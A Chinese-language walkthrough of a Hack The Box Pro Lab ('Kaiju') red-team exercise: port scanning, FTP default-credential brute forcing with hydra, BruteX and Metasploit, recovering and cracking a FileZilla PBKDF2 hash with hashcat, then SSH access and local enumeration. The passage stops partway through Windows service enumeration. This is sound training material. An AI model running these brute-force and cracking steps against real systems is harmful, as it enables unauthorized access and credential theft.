---
title: HTB-Kaiju
description: 'Pro Labs-Kaiju'
pubDate: 2026-03-24
image: /Pro-Labs/Kaiju.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/hackthebox-prolabs/Kaiju-1.png)

# Introduction
> You are tasked with performing a red team engagement on Kaiju Inc. Your goal is to assess the security posture of the environment by attempting to gain access to the internal network and escalate privileges within the domain.  
**你的任务是对 Kaiju Inc.进行红队行动。你的目标是通过尝试获得内部网络访问权限并提升域内权限，来评估环境的安全态势。**
>
> Kaiju is a small Active Directory scenario that provides hands-on experience with common Active Directory vulnerabilities and misconfigurations, demonstrating how attackers can pivot between services and retrieve sensitive data to move laterally and escalate privileges.  
**Kaiju 是一个小型 Active Directory 场景，提供对常见 Active Directory 漏洞和配置错误的实际作体验，展示了攻击者如何在服务间切换并获取敏感数据以横向移动并升级权限。**
>
> Kaiju is designed for penetration testers and red teamers in search of a quick and challenging lab. It is well-suited for those seeking to understand real-world misconfigurations and Active Directory attacks.  
**Kaiju 是为渗透测试者和红队成员设计的，他们想要快速且有挑战性的实验室。它非常适合那些希望理解现实世界错误配置和 Active Directory 攻击的人。**
>
> This Red Team Operator I lab will expose players to:  
**这个红队 I 实验室将让玩家接触到：**
>
> Active Directory enumeration and attacks  
**Active Directory 枚举与攻击**
>
> Abusing misconfigurations in common services  
**滥用公共服务中的错误配置**
>
> DLL injections  **DLL 注入**
>
> Network Pivoting  **网络枢纽**
>
> Local privilege escalation  
**本地特权升级**
>
> Common Active Directory Certificate Services attacks  
**常见的 Active Directory 证书服务攻击**
>
> **<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">入口IP: </font>****<u><font style="color:rgb(46, 119, 229);background-color:rgb(245, 250, 255);">10.13.38.41</font></u>**
>

# StartPoint
## rustscan
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# rustscan -a 10.13.38.41 -- -A -n     
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
Open 10.13.38.41:21
Open 10.13.38.41:22
Open 10.13.38.41:445
Open 10.13.38.41:3389
Open 10.13.38.41:5357
Open 10.13.38.41:5985
    
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 13:08 +0800

Scanned at 2026-03-23 13:08:54 CST for 89s

PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 FileZilla ftpd 1.8.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Issuer: commonName=filezilla-server self signed certificate
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2023-12-17T14:33:49
| Not valid after:  2024-12-17T14:38:49
| MD5:     96eb 4628 bac7 7bd6 ad46 b498 0020 02fd
| SHA-1:   ad85 50b5 089e 34a7 8bb9 d8ef 3a67 668c c3dc 5502
| SHA-256: 3ec7 e7ef c685 c97e 3fe5 a13b 4f2d 4e93 2be2 f527 037f e88e 60e2 ae4a 1636 7709
| -----BEGIN CERTIFICATE-----
| MIIBhzCCAS6gAwIBAgIUsSSvZaTc2Pd3JBJASMNt7P/WXk0wCgYIKoZIzj0EAwIw
| MzExMC8GA1UEAxMoZmlsZXppbGxhLXNlcnZlciBzZWxmIHNpZ25lZCBjZXJ0aWZp
| Y2F0ZTAeFw0yMzEyMTcxNDMzNDlaFw0yNDEyMTcxNDM4NDlaMDMxMTAvBgNVBAMT
| KGZpbGV6aWxsYS1zZXJ2ZXIgc2VsZiBzaWduZWQgY2VydGlmaWNhdGUwWTATBgcq
| hkjOPQIBBggqhkjOPQMBBwNCAASAKf3+dRIJPcEobvJZ6c2QrE76a38eHGzMnrJw
| yOIiOGJVlFE6zTHl5GsYwm+L55u+DjjWD21g0vcbIO+TmRhZoyAwHjAOBgNVHQ8B
| Af8EBAMCBaAwDAYDVR0TAQH/BAIwADAKBggqhkjOPQQDAgNHADBEAiBrj9KDMuo8
| iu7Vt3c0yi251b/USYfZcf9cQ3tMKtiovwIgXZynhXp9KP4AEOj+h5vG48OHIVLn
| aILopOyJYCrfo5c=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  ftp
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla.
                        
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
                        
445/tcp  open  microsoft-ds? syn-ack ttl 127
                        
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: KAIJU
|   NetBIOS_Domain_Name: KAIJU
|   NetBIOS_Computer_Name: BERSRV200
|   DNS_Domain_Name: kaiju.vl
|   DNS_Computer_Name: BERSRV200.kaiju.vl
|   DNS_Tree_Name: kaiju.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-23T05:09:41+00:00
| ssl-cert: Subject: commonName=BERSRV200.kaiju.vl
| Issuer: commonName=BERSRV200.kaiju.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-22T03:47:10
| Not valid after:  2026-09-21T03:47:10
| MD5:     2b62 0f3c 9604 6e5c 6f0c 5306 99ec b974
| SHA-1:   9f8f 49e2 3821 30e3 aac4 83c8 cb87 806a 4292 1142
| SHA-256: 50c2 1aba d0d5 f705 ca8e 2af9 0c0b 9450 2b1e 2a03 cf23 0b58 6da2 1de1 48bb af8f
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQYDDv3qLkdYBPaRqztwQPnzANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJCRVJTUlYyMDAua2FpanUudmwwHhcNMjYwMzIyMDM0NzEwWhcN
| MjYwOTIxMDM0NzEwWjAdMRswGQYDVQQDExJCRVJTUlYyMDAua2FpanUudmwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDB+yBnqSgdnPFiWAPxFMUw7YTT
| dkiOZxkXj50VtIV+Ld7Zur8BrWgtINrYchLwCm4uzvsKTWKSGWsboyAm79tcTmTM
| 2oBxo773f7arKL9qFXfXxesmjmDggqI93lmylhV9Z1bY5UvLpOlAp4/6xg48FAtn
| Tl+9X5aPUhWjk89NnajCygNWKqIwrVNfNi4cMxzqNSL0snuqyUSN8bLc9OuuvauP
| aYKNikuUX09LOQwLTbqMr9+RZZCsSBlxKHiqacZj/TY4Wfl845bD2xx3ipMFLSu6
| rdWGdMnyecTLT+I5Vz5TqOey+0zGQUun6mf8gGTvcknFv76uHltUWklBD1glAgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAlP+Nihai3145QHNvhnf+CkNktetM2o0VFaE9ij+L1YhZgsVn
| xbacbLEGRNUZbXVdOVHqZGFFb0imlfpj7y2O985wkFDjzT8ZLLwsJCbd88jRmrR1
| BsKmU29YZpN8XLcPKCjlMEelErTfVSZHS2aixWGIEMml7P07q9pFquJZ/E1+lZaj
| uK4WtFSiNgAfPGwR4caPFvVr+hn1pGiR8SALG1yE7OWqcOFNIReeyPCVvWY8sOCJ
| 1unmTIlqgTe3tl+o2PLgD/FxVeWpMKZSGrhiyvXA+rwDji+gSiXEVtFWfwo5z4YR
| GSz5eT9VoldsnY4Cx9npXn6n//AJnrMm9nvcvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-23T05:10:20+00:00; +3s from scanner time.
                        
5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
                        
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/23%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69C0CB3F%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=A)
SEQ(SP=FE%GCD=1%ISR=10F%TI=I%II=I%SS=S%TS=A)
OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.059 days (since Mon Mar 23 11:45:29 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53920/tcp): CLEAN (Timeout)
|   Check 2 (port 13128/tcp): CLEAN (Timeout)
|   Check 3 (port 4587/udp): CLEAN (Timeout)
|   Check 4 (port 19339/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-23T05:09:45
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   476.86 ms 10.10.16.1
2   476.97 ms 10.13.38.41

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.77 seconds
           Raw packets sent: 94 (7.820KB) | Rcvd: 36 (2.268KB)
```

## enum4linux-ng
> 探测到SMB服务开放，使用enum4linux-ng进行枚举
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# enum4linux-ng -A 10.13.38.41                                                            
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.13.38.41
[*] Username ......... ''
[*] Random Username .. 'panjhxcw'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ====================================
|    Listener Scan on 10.13.38.41    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for 10.13.38.41    |
 ==========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ========================================
|    SMB Dialect Check on 10.13.38.41    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true                                                                                       
  SMB 2.1: true                                                                                         
  SMB 3.0: true                                                                                         
  SMB 3.1.1: true                                                                                       
Preferred dialect: SMB 3.0                                                                              
SMB1 only: false                                                                                        
SMB signing required: false                                                                             

 ==========================================================
|    Domain Information via SMB session for 10.13.38.41    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: BERSRV200                                                                        
NetBIOS domain name: KAIJU                                                                              
DNS domain: kaiju.vl                                                                                    
FQDN: BERSRV200.kaiju.vl                                                                                
Derived membership: domain member                                                                       
Derived domain: KAIJU                                                                                   

 ========================================
|    RPC Session Check on 10.13.38.41    |
 ========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ==============================================
|    OS Information via RPC for 10.13.38.41    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                
OS version: '10.0'                                                                                      
OS release: ''                                                                                          
OS build: '20348'                                                                                       
Native OS: not supported                                                                                
Native LAN manager: not supported                                                                       
Platform id: null                                                                                       
Server type: null                                                                                       
Server type string: null                                                                                

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials
```

## 添加hosts
```c
echo "10.13.38.41 BERSRV200.kaiju.vl kaiju.vl" >> /etc/hosts
```

## VHost 爆破(失败)
```c
SIZE=$(curl -s http://10.13.38.41:5357 | wc -c) && ffuf -u http://10.13.38.41:5357 -H "Host: FUZZ.kaiju.vl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fs $SIZE
```

## DNS枚举(失败)
```c
dnsenum --dnsserver 10.13.38.41 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt kaiju.vl
```

## Ftp匿名登录(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# ftp 10.13.38.41
Connected to 10.13.38.41.

Name (10.13.38.41:kali): anonymous
331 Please, specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

## smbclient(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# smbclient -L //10.13.38.41 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

## crackmapexec(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# crackmapexec smb 10.13.38.41
SMB         10.13.38.41     445    BERSRV200        [*] Windows Server 2022 Build 20348 (name:BERSRV200) (domain:kaiju.vl) (signing:False) (SMBv1:False)
```

## smbmap(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# smbmap -H 10.13.38.41

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                      
[/] Enumerating shares...      
[/] Authenticating...
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                         
[!] Something weird happened on (10.13.38.41) Error occurs while reading from remote(104) on line 1015
[-] Closing connections.. 
[*] Closed 1 connections                   
```

## FTP
### hydra枚举(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.13.38.41

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 13:29:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://10.13.38.41:21/
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 13:30:23
```

### brutex枚举
[https://github.com/1N3/BruteX](https://github.com/1N3/BruteX)

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# brutex 10.13.38.41 21 --min-rate 1000 -t 15
 __________                __         ____  ___
 \______   \_______ __ ___/  |_  ____ \   \/  /
  |    |  _/\_  __ \  |  \   __\/ __ \ \     / 
  |    |   \ |  | \/  |  /|  | \  ___/ /     \ 
  |______  / |__|  |____/ |__|  \___  >___/\  \ 
         \/                         \/      \_/

 + -- --=[ BruteX v2.3 by @xer0dayz
 + -- --=[ http://xerosecurity.com


################################### Running Port Scan ##############################
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 13:38 +0800
Nmap scan report for BERSRV200.kaiju.vl (10.13.38.41)
Host is up (0.21s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds

################################### Running Brute Force ############################

 + -- --=[ Port 21 opened... running tests...
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 13:38:43
[DATA] max 30 tasks per 1 server, overall 30 tasks, 225 login tries, ~8 tries per task
[DATA] attacking ftp://10.13.38.41:21/

[21][ftp] host: 10.13.38.41   login: admin   password: admin
[21][ftp] host: 10.13.38.41   login: adtec
[21][ftp] host: 10.13.38.41   login: Root
[21][ftp] host: 10.13.38.41   login: ftp   password: ftp
```

![](/image/hackthebox-prolabs/Kaiju-2.png)

### msf枚举
> 通过 [https://github.com/1N3/BruteX/blob/master/wordlists/ftp-default-userpass.txt](https://github.com/1N3/BruteX/blob/master/wordlists/ftp-default-userpass.txt) 字表
>
> 测试 ftp 凭证，我们发现 ftp：ftp 凭证是有效的
>
> USERPASS_FILE  格式为账户密码以空格分隔，因此需要处理下原始字典
>

```c
sed 's/:/ /g' /usr/share/wordlists/brutex/ftp-default-userpass.txt > /usr/share/wordlists/brutex/ftp-msf-userpass.txt
```

```c
msf auxiliary(scanner/ftp/ftp_login) > show options
Module options (auxiliary/scanner/ftp/ftp_login):
Name              Current Setting            Required  Description
----              ---------------            --------  -----------
USERPASS_FILE                                 no        File containing users and passwords separated by space, one pair per line



msf > use auxiliary/scanner/ftp/ftp_login 
msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS 10.13.38.41
RHOSTS => 10.13.38.41
msf auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE /usr/share/wordlists/brutex/ftp-default-userpass.txt
USERPASS_FILE => /usr/share/wordlists/brutex/ftp-default-userpass.txt
msf auxiliary(scanner/ftp/ftp_login) > run
[*] 10.13.38.41:21        - 10.13.38.41:21 - Starting FTP login sweep
[+] 10.13.38.41:21        - 10.13.38.41:21 - Login Successful: ftp:ftp
```

![](/image/hackthebox-prolabs/Kaiju-3.png)

### FTP递归下载
> 利用凭据ftp：ftp成功登录
>

```c
wget -r --no-passive --no-check-certificate "ftp://ftp:ftp@10.13.38.41"
```

### 敏感信息
```c
firewall:firewall123
```

```c
administrator:[Moved to KeePass]
```

```c
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<filezilla xmlns:fz="https://filezilla-project.org" xmlns="https://filezilla-project.org" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" fz:product_flavour="standard" fz:product_version="1.8.0">
	<default_impersonator index="0" enabled="false">
		<name></name>
		<password></password>
	</default_impersonator>
	<user name="&lt;system user>" enabled="false">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="%&lt;home>" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description>This user can impersonate any system user.</description>
		<impersonation login_only="false" />
		<methods>1</methods>
	</user>
	<user name="backup" enabled="true">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="E:\Private" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description></description>
		<password index="1">
			<hash>ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU</hash>
			<salt>aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw</salt>
			<iterations>100000</iterations>
		</password>
		<methods>1</methods>
	</user>
	<user name="ftp" enabled="true">
		<mount_point tvfs_path="/" access="1" native_path="" new_native_path="E:\Public" recursive="2" flags="0" />
		<rate_limits inbound="unlimited" outbound="unlimited" session_inbound="unlimited" session_outbound="unlimited" />
		<allowed_ips></allowed_ips>
		<disallowed_ips></disallowed_ips>
		<session_open_limits files="unlimited" directories="unlimited" />
		<session_count_limit>unlimited</session_count_limit>
		<description></description>
		<password index="0" />
		<methods>0</methods>
	</user>
</filezilla>
```

### 哈希破解
> [https://forum.filezilla-project.org/viewtopic.php?t=54821](https://forum.filezilla-project.org/viewtopic.php?t=54821)
>
> 正如本论坛所述，该哈希是使用 sha256 进行的 PBKDF2 哈希
>

#### 哈希格式
```c
sha256:100000:aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw:ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU
```

#### rockyou(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# hashcat -m 10900 userhash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU


Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
    
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
```

#### 字典创建
> 我们翻查到firewall:firewall123，发现管理员常用密码格式为名字+123
>
> users.xml中需要破解哈希的用户名为backup
>
> <user name="backup" enabled="true">
>
> 由此尝试创建密码包含backup123
>

```c
firewall123
backup123
filezilla123
administrator123
kaiju123
```

#### hashcat
> 成功拿到凭据backup:backup123
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# hashcat -m 10900 userhash ./pass 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (4045 MB free)

Dictionary cache built:
* Filename..: ./pass
* Passwords.: 7
* Bytes.....: 59
* Keyspace..: 7
* Runtime...: 0 secs

sha256:100000:aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw:ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU:backup123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:100000:aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK...HYjNFU
Time.Started.....: Mon Mar 23 15:29:02 2026 (0 secs)
Time.Estimated...: Mon Mar 23 15:29:02 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (./pass)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       93 H/s (0.56ms) @ Accel:180 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7/7 (100.00%)
Rejected.........: 0/7 (0.00%)
Restore.Point....: 0/7 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:99000-99999
Candidate.Engine.: Device Generator
Candidates.#01...: backup -> firewall123
Hardware.Mon.#01.: Util: 22%

Started: Mon Mar 23 15:29:01 2026
Stopped: Mon Mar 23 15:29:04 2026
```

## SSH
### ssh登录
> 通过凭据backup:backup123 成功ssh登录
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# sshpass -p backup123 ssh backup@10.13.38.41

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

backup@BERSRV200 C:\Users\backup>
```

### 信息收集
#### whoami
> 本地账户 bersrv200\backup（非域账户）
>
> Medium Integrity Level — 无高权限
>
> 无 SeImpersonatePrivilege、无 SeBackupPrivilege、无 SeDebugPrivilege
>
> 仅有两个最基础权限，基本没有直接提权路径
>

```c
backup@BERSRV200 C:\Users\backup>whoami /all

USER INFORMATION
----------------

User Name        SID
================ ===========================================
bersrv200\backup S-1-5-21-2619869422-1307147141-4583047-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                         

====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                     



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### 其它用户
> 我们发现了其它用户:
>
> 1. clare.frost
> 2. sasrv200
>

![](/image/hackthebox-prolabs/Kaiju-4.png) 

#### 查看服务
```c
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\
```

```c
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET CLR Data
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET CLR Networking
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET CLR Networking 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET Data Provider for Oracle
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET Data Provider for SqlServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NET Memory Cache 4.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\.NETFramework
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\1394ohci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\3ware
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ACPI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AcpiDev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\acpiex
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\acpipagr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AcpiPmi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\acpitime
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Acx01000
